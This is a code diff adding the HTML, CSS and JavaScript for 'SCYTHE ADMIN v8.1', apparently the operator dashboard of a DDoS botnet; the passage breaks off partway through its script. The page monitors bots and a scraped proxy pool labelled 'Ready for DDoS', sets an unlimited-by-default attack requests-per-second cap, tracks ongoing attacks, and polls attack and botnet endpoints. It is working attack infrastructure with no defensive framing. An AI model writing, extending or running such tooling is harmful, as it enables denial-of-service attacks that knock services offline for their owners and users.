@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SCYTHE ADMIN v8.1 - Real-Time Control Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-green: #00ff41;
+            --neon-purple: #b026ff;
+            --neon-cyan: #00f3ff;
+            --neon-red: #ff0040;
+            --neon-yellow: #ffee00;
+            --neon-orange: #ff8800;
+            --dark-bg: #0a0a0f;
+            --darker-bg: #050508;
+            --panel-bg: rgba(10, 10, 15, 0.85);
+            --input-bg: rgba(0, 0, 0, 0.5);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--dark-bg);
+            color: var(--neon-green);
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+        }
+        .bg-grid {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+            background-size: 50px 50px; pointer-events: none; z-index: -1;
+        }
+        .scanline {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.1) 50%);
+            background-size: 100% 4px; pointer-events: none; z-index: 1000;
+            animation: scanline 8s linear infinite;
+        }
+        @keyframes scanline { 0% { transform: translateY(0); } 100% { transform: translateY(10px); } }
+
+        .header {
+            background: var(--darker-bg);
+            border-bottom: 2px solid var(--neon-green);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky; top: 0; z-index: 100;
+        }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 28px; font-weight: 900; color: var(--neon-green); text-shadow: 0 0 20px rgba(0,255,65,0.5); letter-spacing: 4px; }
+        .logo span { color: var(--neon-cyan); text-shadow: 0 0 20px rgba(0,243,255,0.5); }
+        .status-dot { width: 12px; height: 12px; border-radius: 50%; background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .clock { font-size: 18px; color: var(--neon-cyan); }
+        .nav-link { color: var(--neon-cyan); text-decoration: none; margin-left: 20px; font-size: 14px; border: 1px solid var(--neon-cyan); padding: 6px 14px; border-radius: 4px; transition: 0.3s; }
+        .nav-link:hover { background: rgba(0,243,255,0.1); box-shadow: 0 0 15px rgba(0,243,255,0.3); }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 30px 40px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        @media (max-width: 1200px) { .main-grid { grid-template-columns: 1fr; } }
+
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 0 10px rgba(0,255,65,0.2);
+            backdrop-filter: blur(10px);
+        }
+        .panel:hover { border-color: rgba(0,255,65,0.5); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+        .panel-header {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            border-bottom: 1px solid rgba(0,255,65,0.2);
+            padding-bottom: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--neon-green);
+        }
+        .panel-header.green { color: var(--neon-green); border-bottom-color: rgba(0,255,65,0.2); }
+        .panel-header.cyan { color: var(--neon-cyan); border-bottom-color: rgba(0,243,255,0.2); }
+        .panel-header.red { color: var(--neon-red); border-bottom-color: rgba(255,0,64,0.2); }
+        .panel-header.orange { color: var(--neon-orange); border-bottom-color: rgba(255,136,0,0.2); }
+        .panel-header.purple { color: var(--neon-purple); border-bottom-color: rgba(176,38,255,0.2); }
+        .panel-header.yellow { color: var(--neon-yellow); border-bottom-color: rgba(255,238,0,0.2); }
+
+        .badge {
+            background: rgba(0,255,65,0.1);
+            border: 1px solid var(--neon-green);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            color: var(--neon-green);
+        }
+        .badge.green { background: rgba(0,255,65,0.15); border-color: var(--neon-green); color: var(--neon-green); }
+        .badge.red { background: rgba(255,0,64,0.1); border-color: var(--neon-red); color: var(--neon-red); }
+        .badge.cyan { background: rgba(0,243,255,0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); }
+        .badge.yellow { background: rgba(255,238,0,0.1); border-color: var(--neon-yellow); color: var(--neon-yellow); }
+        .badge.purple { background: rgba(176,38,255,0.1); border-color: var(--neon-purple); color: var(--neon-purple); }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
+        .stat-card {
+            background: rgba(0,255,65,0.05);
+            border: 1px solid rgba(0,255,65,0.15);
+            border-radius: 6px;
+            padding: 20px;
+            text-align: center;
+        }
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            color: var(--neon-green);
+            text-shadow: 0 0 15px rgba(0,255,65,0.3);
+        }
+        .stat-value.green { color: var(--neon-green); text-shadow: 0 0 15px rgba(0,255,65,0.3); }
+        .stat-value.cyan { color: var(--neon-cyan); text-shadow: 0 0 15px rgba(0,243,255,0.3); }
+        .stat-value.red { color: var(--neon-red); text-shadow: 0 0 15px rgba(255,0,64,0.3); }
+        .stat-value.orange { color: var(--neon-orange); text-shadow: 0 0 15px rgba(255,136,0,0.3); }
+        .stat-value.purple { color: var(--neon-purple); text-shadow: 0 0 15px rgba(176,38,255,0.3); }
+        .stat-value.yellow { color: var(--neon-yellow); text-shadow: 0 0 15px rgba(255,238,0,0.3); }
+        .stat-label { font-size: 12px; color: rgba(0,255,65,0.6); text-transform: uppercase; }
+
+        .full-width { grid-column: 1 / -1; }
+
+        .btn {
+            background: rgba(0,255,65,0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 5px;
+        }
+        .btn:hover {
+            background: rgba(0,255,65,0.25);
+            box-shadow: 0 0 20px rgba(0,255,65,0.3);
+            transform: translateY(-2px);
+        }
+        .btn.green { border-color: var(--neon-green); color: var(--neon-green); background: rgba(0,255,65,0.1); }
+        .btn.green:hover { background: rgba(0,255,65,0.25); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+        .btn.red { border-color: var(--neon-red); color: var(--neon-red); background: rgba(255,0,64,0.1); }
+        .btn.red:hover { background: rgba(255,0,64,0.25); box-shadow: 0 0 20px rgba(255,0,64,0.3); }
+        .btn.cyan { border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0,243,255,0.1); }
+        .btn.cyan:hover { background: rgba(0,243,255,0.25); box-shadow: 0 0 20px rgba(0,243,255,0.3); }
+        .btn.orange { border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,136,0,0.1); }
+        .btn.orange:hover { background: rgba(255,136,0,0.25); box-shadow: 0 0 20px rgba(255,136,0,0.3); }
+        .btn.purple { border-color: var(--neon-purple); color: var(--neon-purple); background: rgba(176,38,255,0.1); }
+        .btn.purple:hover { background: rgba(176,38,255,0.25); box-shadow: 0 0 20px rgba(176,38,255,0.3); }
+
+        .form-control {
+            background: var(--input-bg);
+            border: 1px solid rgba(0,255,65,0.3);
+            border-radius: 6px;
+            padding: 10px 15px;
+            color: var(--neon-green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            outline: none;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        .form-control:focus {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 15px rgba(0,255,65,0.2);
+        }
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .health-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(0,255,65,0.1);
+        }
+        .health-item .label { color: rgba(0,255,65,0.7); }
+        .health-item .status { font-weight: bold; }
+        .health-item .status.online { color: var(--neon-green); }
+        .health-item .status.offline { color: var(--neon-red); }
+        .health-item .status.loading { color: var(--neon-yellow); }
+
+        .proxy-list {
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .proxy-list::-webkit-scrollbar { width: 4px; }
+        .proxy-list::-webkit-scrollbar-thumb { background: var(--neon-green); border-radius: 2px; }
+        .proxy-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(0,255,65,0.05);
+        }
+        .proxy-item .ip { color: var(--neon-cyan); }
+        .proxy-item .alive { color: var(--neon-green); }
+        .proxy-item .dead { color: var(--neon-red); }
+
+        .log-container {
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.5);
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 12px;
+            color: rgba(0,255,65,0.7);
+        }
+        .log-container::-webkit-scrollbar { width: 4px; }
+        .log-container::-webkit-scrollbar-thumb { background: var(--neon-green); border-radius: 2px; }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid rgba(0,255,65,0.05); }
+        .log-entry.refresh { color: var(--neon-cyan); }
+        .log-entry.attack { color: var(--neon-orange); }
+        .log-entry.proxy { color: var(--neon-purple); }
+        .log-entry.alert { color: var(--neon-red); font-weight: bold; }
+        .log-entry.success { color: var(--neon-green); }
+
+        .concurrent-control {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        .concurrent-control input,
+        .rps-control input {
+            width: 100px;
+            background: var(--input-bg);
+            border: 1px solid rgba(0,255,65,0.3);
+            border-radius: 4px;
+            padding: 8px 12px;
+            color: var(--neon-green);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 16px;
+            text-align: center;
+        }
+        .concurrent-control input:focus,
+        .rps-control input:focus {
+            border-color: var(--neon-green);
+        }
+
+        .rps-control {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(0,255,65,0.15);
+        }
+        .rps-control label {
+            color: var(--neon-cyan);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: rgba(0,255,65,0.3);
+            font-size: 12px;
+            border-top: 1px solid rgba(0,255,65,0.1);
+            margin-top: 40px;
+        }
+        .footer span { color: var(--neon-cyan); }
+
+        .alert {
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+        .alert.success { background: rgba(0,255,65,0.1); border: 1px solid var(--neon-green); color: var(--neon-green); }
+        .alert.error { background: rgba(255,0,64,0.1); border: 1px solid var(--neon-red); color: var(--neon-red); }
+        .alert.info { background: rgba(0,243,255,0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); }
+        .alert.warning { background: rgba(255,238,0,0.1); border: 1px solid var(--neon-yellow); color: var(--neon-yellow); }
+        .alert.show { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .ongoing-attack-card {
+            background: rgba(0, 10, 0, 0.6);
+            border: 1px solid rgba(0,255,65,0.2);
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 10px;
+            transition: all 0.3s;
+        }
+        .ongoing-attack-card:hover {
+            border-color: rgba(0,255,65,0.5);
+            box-shadow: 0 0 15px rgba(0,255,65,0.15);
+        }
+        .ongoing-attack-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0,255,65,0.1);
+        }
+        .ongoing-attack-id {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            color: var(--neon-cyan);
+        }
+        .ongoing-attack-method {
+            background: rgba(176, 38, 255, 0.15);
+            border: 1px solid var(--neon-purple);
+            color: var(--neon-purple);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+        .ongoing-attack-info {
+            font-size: 12px;
+            color: rgba(0,255,65,0.7);
+            margin-bottom: 10px;
+        }
+        .ongoing-attack-info span {
+            color: var(--neon-green);
+            font-weight: bold;
+        }
+        .ongoing-attack-rps-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .ongoing-attack-rps-control input {
+            width: 90px;
+            background: var(--input-bg);
+            border: 1px solid rgba(0,243,255,0.3);
+            border-radius: 4px;
+            padding: 6px 10px;
+            color: var(--neon-cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            text-align: center;
+        }
+        .ongoing-attack-rps-control input:focus {
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 10px rgba(0,243,255,0.2);
+        }
+        .ongoing-attack-rps-control .btn {
+            padding: 6px 14px;
+            font-size: 12px;
+        }
+        .no-attacks {
+            text-align: center;
+            padding: 30px;
+            color: rgba(0,255,65,0.3);
+            font-size: 13px;
+        }
+
+        /* ===== NEW: LIVE PROXY MONITOR STYLES ===== */
+        .proxy-monitor-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .proxy-monitor-card {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(0,255,65,0.1);
+            border-radius: 6px;
+            padding: 15px;
+            text-align: center;
+        }
+        .proxy-monitor-card .value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+        }
+        .proxy-monitor-card .label {
+            font-size: 11px;
+            color: rgba(0,255,65,0.5);
+            text-transform: uppercase;
+        }
+        .proxy-source-list {
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .proxy-source-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(0,255,65,0.05);
+        }
+        .proxy-source-item .name { color: var(--neon-cyan); }
+        .proxy-source-item .rate { color: var(--neon-green); }
+        .proxy-source-item .rate.bad { color: var(--neon-red); }
+
+        /* ===== NEW: RPS ALERT STYLES ===== */
+        .alert-card {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,0,64,0.2);
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 8px;
+            font-size: 12px;
+        }
+        .alert-card.warning { border-color: rgba(255,238,0,0.3); }
+        .alert-card.critical { border-color: rgba(255,136,0,0.3); }
+        .alert-card.fatal { border-color: rgba(255,0,64,0.4); }
+        .alert-card .severity {
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 11px;
+            margin-bottom: 4px;
+        }
+        .alert-card .time { color: rgba(0,255,65,0.5); font-size: 11px; }
+        .alert-card .cause { color: rgba(255,0,64,0.7); margin-top: 4px; }
+
+        /* ===== NEW: WEBSOCKET STATUS ===== */
+        .ws-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+        }
+        .ws-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--neon-red);
+            box-shadow: 0 0 5px var(--neon-red);
+        }
+        .ws-dot.connected {
+            background: var(--neon-green);
+            box-shadow: 0 0 5px var(--neon-green);
+        }
+        .ws-dot.connecting {
+            background: var(--neon-yellow);
+            box-shadow: 0 0 5px var(--neon-yellow);
+            animation: pulse 1s infinite;
+        }
+
+        /* ===== NEW: REFRESH LOG STYLES ===== */
+        .refresh-log-container {
+            max-height: 150px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 11px;
+        }
+        .refresh-log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(0,243,255,0.05);
+            color: rgba(0,243,255,0.7);
+        }
+        .refresh-log-entry .time { color: rgba(0,255,65,0.4); margin-right: 8px; }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="scanline"></div>
+
+    <header class="header">
+        <div class="logo">ADMIN<span>CTRL</span></div>
+        <div style="display:flex;align-items:center;gap:10px;">
+            <div class="ws-status" id="wsStatus">
+                <div class="ws-dot" id="wsDot"></div>
+                <span id="wsText">WS: OFFLINE</span>
+            </div>
+            <div class="status-dot"></div>
+            <span>SYSTEM ONLINE</span>
+            <a href="/" class="nav-link">← BACK TO DASHBOARD</a>
+        </div>
+        <div class="clock" id="clock">00:00:00</div>
+    </header>
+
+    <main class="main-grid">
+        <!-- ===== EXISTING: System Health ===== -->
+        <div class="panel full-width">
+            <div class="panel-header green">
+                🩺 System Health
+                <span class="badge green" id="healthBadge">ALL GOOD</span>
+            </div>
+            <div id="healthContainer">
+                <div class="health-item"><span class="label">API Status</span><span class="status loading" id="healthApi">Checking...</span></div>
+                <div class="health-item"><span class="label">Attack Endpoint</span><span class="status loading" id="healthAttack">Checking...</span></div>
+                <div class="health-item"><span class="label">History Endpoint</span><span class="status loading" id="healthHistory">Checking...</span></div>
+                <div class="health-item"><span class="label">Proxy Pool</span><span class="status loading" id="healthProxy">Checking...</span></div>
+                <div class="health-item"><span class="label">Botnet Connection</span><span class="status loading" id="healthBotnet">Checking...</span></div>
+            </div>
+            <div style="margin-top:15px;display:flex;gap:10px;flex-wrap:wrap;">
+                <button class="btn green" onclick="checkHealth()">🔄 Refresh Health</button>
+                <button class="btn cyan" onclick="restartService()">♻️ Restart Service</button>
+                <button class="btn red" onclick="clearLogs()">🗑️ Clear Logs</button>
+            </div>
+        </div>
+
+        <!-- ===== NEW: Live Proxy Monitor ===== -->
+        <div class="panel full-width">
+            <div class="panel-header purple">
+                🔍 Live Proxy Monitor
+                <span class="badge purple" id="proxyMonitorBadge">LIVE</span>
+            </div>
+            <div class="proxy-monitor-grid">
+                <div class="proxy-monitor-card">
+                    <div class="value green" id="monitorTotal">0</div>
+                    <div class="label">Total Scraped</div>
+                </div>
+                <div class="proxy-monitor-card">
+                    <div class="value cyan" id="monitorAlive">0</div>
+                    <div class="label">Passed Filter</div>
+                </div>
+                <div class="proxy-monitor-card">
+                    <div class="value green" id="monitorReady">0</div>
+                    <div class="label">Ready for DDoS</div>
+                </div>
+            </div>
+            <div style="margin-bottom:15px;">
+                <strong style="color:var(--neon-purple);font-size:12px;text-transform:uppercase;">📡 Proxy Source Performance</strong>
+                <div class="proxy-source-list" id="proxySourceList">
+                    <div style="text-align:center;padding:10px;color:rgba(0,255,65,0.3);">Loading sources...</div>
+                </div>
+            </div>
+            <div>
+                <strong style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">📝 Recent Proxy Refresh Log</strong>
+                <div class="refresh-log-container" id="refreshLogContainer">
+                    <div class="refresh-log-entry"><span class="time">--:--:--</span>Waiting for refresh data...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== NEW: RPS Drop Alert ===== -->
+        <div class="panel full-width">
+            <div class="panel-header red">
+                🚨 RPS Drop Alert Monitor
+                <span class="badge red" id="alertBadge">MONITORING</span>
+            </div>
+            <div id="rpsAlertContainer">
+                <div style="text-align:center;padding:20px;color:rgba(0,255,65,0.3);">No alerts detected. System healthy.</div>
+            </div>
+            <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;">
+                <button class="btn red" onclick="clearAlerts()">🧹 Clear Alerts</button>
+                <button class="btn cyan" onclick="testAlert()">🧪 Test Alert</button>
+            </div>
+        </div>
+
+        <!-- ===== EXISTING: Proxy Management ===== -->
+        <div class="panel full-width">
+            <div class="panel-header green">
+                🌐 Proxy Management
+                <span class="badge green" id="proxyBadge">MANUAL</span>
+            </div>
+            <div class="stats-grid" style="margin-bottom:20px;">
+                <div class="stat-card">
+                    <div class="stat-value green" id="totalProxy">0</div>
+                    <div class="stat-label">Total Proxies</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value cyan" id="aliveProxy">0</div>
+                    <div class="stat-label">Alive Proxies</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value red" id="deadProxy">0</div>
+                    <div class="stat-label">Dead Proxies</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value orange" id="lastScrap">Never</div>
+                    <div class="stat-label">Last Scrap</div>
+                </div>
+            </div>
+
+            <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
+                <button class="btn cyan" onclick="refreshProxyPool()">🔄 Refresh Pool</button>
+                <button class="btn red" onclick="removeDeadProxies()">🧹 Remove Dead</button>
+                <button class="btn orange" onclick="scrapProxy()">📥 Scrap Proxy</button>
+            </div>
+
+            <div style="margin-bottom:15px;">
+                <label class="form-label" style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">Scrap URLs (one per line)</label>
+                <textarea class="form-control" id="scrapUrls" placeholder="http://proxy-list.com/proxies.txt&#10;https://api.proxy.com/list"></textarea>
+            </div>
+
+            <div>
+                <strong style="color:var(--neon-cyan);font-size:12px;text-transform:uppercase;">Proxy List (alive)</strong>
+                <div class="proxy-list" id="proxyListContainer">
+                    <div style="text-align:center;padding:20px;color:rgba(0,255,65,0.3);">No proxies loaded.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== EXISTING: Botnet & Stats ===== -->
+        <div class="panel">
+            <div class="panel-header cyan">
+                🤖 Botnet Status
+                <span class="badge cyan">ACTIVE</span>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value cyan" id="botActive">0</div>
+                    <div class="stat-label">Active Bots</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="botTotal">0</div>
+                    <div class="stat-label">Total Bots</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value green" id="avgRpm">0</div>
+                    <div class="stat-label">Avg RPM</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value orange" id="totalReqs">0</div>
+                    <div class="stat-label">Total Requests (All Time)</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== EXISTING: Concurrent Control + RPS Limit ===== -->
+        <div class="panel">
+            <div class="panel-header orange">
+                ⚙️ Control Center
+                <span class="badge" style="border-color:var(--neon-orange);color:var(--neon-orange);">SYNC</span>
+            </div>
+            <div class="concurrent-control">
+                <span style="color:var(--neon-cyan);">Max Concurrent:</span>
+                <input type="number" id="maxConcurrentInput" value="5" min="1" max="100">
+                <button class="btn orange" onclick="setMaxConcurrent()">Set</button>
+                <span style="color:rgba(0,255,65,0.5);font-size:12px;">(sync with dashboard)</span>
+            </div>
+            <div style="margin-top:10px;">
+                <div class="stat-card" style="background:rgba(255,136,0,0.05);border-color:rgba(255,136,0,0.15);">
+                    <div class="stat-value orange" id="currentConcurrent">5</div>
+                    <div class="stat-label">Currently Set</div>
+                </div>
+            </div>
+
+            <div class="rps-control">
+                <label>🎯 Attack RPS Limit</label>
+                <input type="number" id="rpsLimitInput" value="0" min="0" step="1000">
+                <button class="btn cyan" onclick="setRpsLimit()">Set RPS</button>
+                <span style="color:rgba(0,255,65,0.5);font-size:12px;">(0 = unlimited)</span>
+            </div>
+            <div style="margin-top:10px;">
+                <div class="stat-card" style="background:rgba(0,243,255,0.05);border-color:rgba(0,243,255,0.15);">
+                    <div class="stat-value cyan" id="currentRpsLimit">0</div>
+                    <div class="stat-label">Current RPS Limit</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== EXISTING: Ongoing Attacks ===== -->
+        <div class="panel full-width">
+            <div class="panel-header cyan">
+                🔥 Ongoing Attacks
+                <span class="badge cyan" id="ongoingBadge">0 ACTIVE</span>
+            </div>
+            <div id="ongoingAttacksContainer">
+                <div class="no-attacks">No active attacks.</div>
+            </div>
+        </div>
+
+        <!-- ===== EXISTING: System Logs ===== -->
+        <div class="panel full-width">
+            <div class="panel-header red">
+                📋 System Logs
+                <span class="badge red">LIVE</span>
+            </div>
+            <div class="log-container" id="logContainer">
+                <div class="log-entry">[SYSTEM] Admin panel initialized.</div>
+                <div class="log-entry">[SYSTEM] Waiting for commands...</div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        SCYTHE ADMIN v8.1 | Real-Time Control Center | <span>Full System Control</span> | Sync: <span>Dashboard + Admin</span>
+    </footer>
+
+    <div id="alertBox" class="alert"></div>
+
+    <script>
+        // ===== CLOCK =====
+        function updateClock() {
+            document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', { hour12: false });
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // ===== ALERT =====
+        function showAlert(message, type) {
+            const alert = document.getElementById('alertBox');
+            alert.textContent = message;
+            alert.className = `alert ${type} show`;
+            setTimeout(() => alert.classList.remove('show'), 5000);
+        }
+
+        // ===== LOG =====
+        function addLog(message, type = '') {
+            const container = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.textContent = `[${time}] ${message}`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // ===== WEBSOCKET =====
+        let ws = null;
+        let wsConnected = false;
+
+        function connectWebSocket() {
+            const wsUrl = `ws://${window.location.host}/admin/ws`;
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = function() {
+                wsConnected = true;
+                updateWsStatus(true);
+                addLog('WebSocket connected', 'success');
+                ws.send(JSON.stringify({"action": "ping"}));
+            };
+
+            ws.onmessage = function(event) {
+                const msg = JSON.parse(event.data);
+                handleWebSocketMessage(msg);
+            };
+
+            ws.onclose = function() {
+                wsConnected = false;
+                updateWsStatus(false);
+                addLog('WebSocket disconnected', 'alert');
+                // Auto-reconnect after 5 seconds
+                setTimeout(connectWebSocket, 5000);
+            };
+
+            ws.onerror = function(e) {
+                addLog('WebSocket error', 'alert');
+            };
+        }
+
+        function updateWsStatus(connected) {
+            const dot = document.getElementById('wsDot');
+            const text = document.getElementById('wsText');
+            if (connected) {
+                dot.className = 'ws-dot connected';
+                text.textContent = 'WS: ONLINE';
+                text.style.color = 'var(--neon-green)';
+            } else {
+                dot.className = 'ws-dot';
+                text.textContent = 'WS: OFFLINE';
+                text.style.color = 'var(--neon-red)';
+            }
+        }
+
+        function handleWebSocketMessage(msg) {
+            if (msg.type === 'rps_alert') {
+                addRpsAlert(msg.data);
+            } else if (msg.type === 'proxy_scrap') {
+                addRefreshLog(msg.data);
+                updateProxyMonitor(msg.data);
+            } else if (msg.type === 'periodic_update') {
+                updateFromPeriodic(msg.data);
+            }
+        }
+
+        // ===== HEALTH CHECK =====
+        async function checkHealth() {
+            const endpoints = [
+                { id: 'healthApi', url: '/api/status' },
+                { id: 'healthAttack', url: '/api/attack' },
+                { id: 'healthHistory', url: '/api/history' },
+                { id: 'healthProxy', url: '/api/proxy/status' },
+                { id: 'healthBotnet', url: '/api/botnet/stats' }
+            ];
+
+            for (const ep of endpoints) {
+                const el = document.getElementById(ep.id);
+                el.textContent = 'Checking...';
+                el.className = 'status loading';
+                try {
+                    const res = await fetch(ep.url, { method: 'HEAD', cache: 'no-cache' });
+                    if (res.ok) {
+                        el.textContent = 'Online';
+                        el.className = 'status online';
+                    } else {
+                        el.textContent = `Error ${res.status}`;
+                        el.className = 'status offline';
+                    }
+                } catch (e) {
+                    el.textContent = 'Offline';
+                    el.className = 'status offline';
+                }
+            }
+
+            const allOnline = document.querySelectorAll('.health-item .status.online').length === endpoints.length;
+            document.getElementById('healthBadge').textContent = allOnline ? 'ALL GOOD' : 'SOME ISSUES';
+            document.getElementById('healthBadge').className = `badge ${allOnline ? 'green' : 'red'}`;
+            addLog(`Health check completed. All online: ${allOnline}`, 'success');
+        }
+
+        // ===== NEW: PROXY MONITOR =====
+        function updateProxyMonitor(data) {
+            if (data.total_scraped !== undefined) {
+                document.getElementById('monitorTotal').textContent = data.total_scraped;
+                document.getElementById('monitorAlive').textContent = data.alive_after_check;
+
+                const ready = data.alive_after_check || 0;
+                document.getElementById('monitorReady').textContent = ready;
+                document.getElementById('monitorReady').style.color = ready >= 50 ? 'var(--neon-green)' : 'var(--neon-red)';
+            }
+        }
+
+        function addRefreshLog(data) {
+            const container = document.getElementById('refreshLogContainer');
+            const entry = document.createElement('div');
+            entry.className = 'refresh-log-entry';
+            const time = new Date().toLocaleTimeString();
+            const successRate = data.success_rate ? data.success_rate.toFixed(1) : '?';
+            entry.innerHTML = `<span class="time">${time}</span>[REFRESH] ${data.source}: ${data.alive_after_check}/${data.total_scraped} alive (${successRate}%)`;
+            container.prepend(entry);
+
+            // Keep only last 20 entries
+            while (container.children.length > 20) {
+                container.removeChild(container.lastChild);
+            }
+        }
+
+        async function loadProxySources() {
+            try {
+                const res = await fetch('/api/proxy/status');
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+
+                if (data.health && data.health.top_sources) {
+                    const container = document.getElementById('proxySourceList');
+                    container.innerHTML = data.health.top_sources.map(s => {
+                        const rate = (s.success_rate * 100).toFixed(1);
+                        const rateClass = s.success_rate >= 0.5 ? '' : 'bad';
+                        return `
+                            <div class="proxy-source-item">
+                                <span class="name">${s.name}</span>
+                                <span class="rate ${rateClass}">${rate}% (${s.last_count})</span>
+                            </div>
+                        `;
+                    }).join('');
+                }
+            } catch (e) {
